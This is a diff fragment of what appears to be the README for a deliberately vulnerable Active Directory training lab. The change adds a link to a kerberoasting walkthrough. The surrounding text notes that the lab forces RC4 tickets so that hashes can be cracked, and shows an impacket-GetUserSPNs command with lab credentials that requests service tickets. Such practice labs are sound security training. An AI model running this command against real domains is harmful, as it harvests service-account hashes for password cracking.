@@ -52,6 +52,8 @@ KDC issue an **RC4 (etype 23)** service ticket, so the roast comes back as a cra
 `$krb5tgs$23$…` hash. This is now baked in — no post-deploy `Set-ADUser` needed.
 
 ### Intended attack
+Full step-by-step: [walkthroughs/kerberoasting.md](walkthroughs/kerberoasting.md).
+
 ```bash
 # Any domain user can request service tickets for accounts with an SPN:
 impacket-GetUserSPNs 'MARVEL.local/fcastle:Password1' -dc-ip 10.0.2.10 -request
